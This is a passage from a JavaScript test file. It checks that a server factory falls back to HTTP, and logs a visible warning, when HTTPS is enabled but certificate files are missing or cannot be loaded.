    // Covers the else-branch: existing installs upgrading with DEFAULT_CONFIG.httpsEnabled=true
    // but no certs yet. Must not crash and must stay on HTTP.
    const server = createServer({ httpsEnabled: true });
    assert.ok(server instanceof http.Server, 'should fall back to http.Server, not crash');
    server.close();
  });

  it('createServer logs a visible warning when HTTPS is enabled but cert paths are missing', () => {
    // The graceful fallback was previously silent — chunk 3 makes it visible.
    const { setLevel } = require('../lib/logger');
    const prev = [];
    const origWrite = process.stdout.write.bind(process.stdout);
    process.stdout.write = (chunk, ...rest) => { prev.push(String(chunk)); return origWrite(chunk, ...rest); };
    setLevel('warn');
    try {
      const server = createServer({ httpsEnabled: true });
      server.close();
    } finally {
      process.stdout.write = origWrite;
      setLevel('error');
    }
    assert.ok(
      prev.some(l => l.includes('HTTPS enabled but cert/key paths not configured')),
      'must emit a warn-level log explaining the HTTP fallback'
    );
  });

  it('createServer logs a visible warning when HTTPS cert files cannot be loaded', () => {
    const { setLevel } = require('../lib/logger');
    const prev = [];
    const origWrite = process.stdout.write.bind(process.stdout);
    process.stdout.write = (chunk, ...rest) => { prev.push(String(chunk)); return origWrite(chunk, ...rest); };
    setLevel('warn');
    try {
      const server = createServer({
        httpsEnabled: true,
        certPath: '/tmp/tc-missing-cert-log-' + Date.now() + '.pem',
        keyPath: '/tmp/tc-missing-key-log-' + Date.now() + '.pem'
      });
      server.close();
    } finally {
      process.stdout.write = origWrite;
      setLevel('error');
    }
    assert.ok(
      prev.some(l => l.includes('HTTPS enabled but cert/key could not be loaded')),
      'must emit a warn-level log when cert files are unreadable'
    );
  });
});
